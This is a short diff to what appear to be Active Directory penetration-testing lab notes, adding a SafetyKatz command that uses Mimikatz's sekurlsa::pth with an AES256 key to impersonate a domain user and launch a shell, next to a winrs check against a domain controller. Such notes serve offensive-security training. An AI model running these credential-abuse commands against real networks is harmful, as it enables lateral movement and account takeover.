@@ -17,6 +17,9 @@ Use winrs to test
 winrs -r:dcorp-dc whoami
 ```
 *Using SafetyKatz*
+```powershell
+.\SafetyKatz.exe "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<HASH> /run:cmd.exe" "exit"
+```
 
 ### **Other Sessions Opened**
 ```powerview
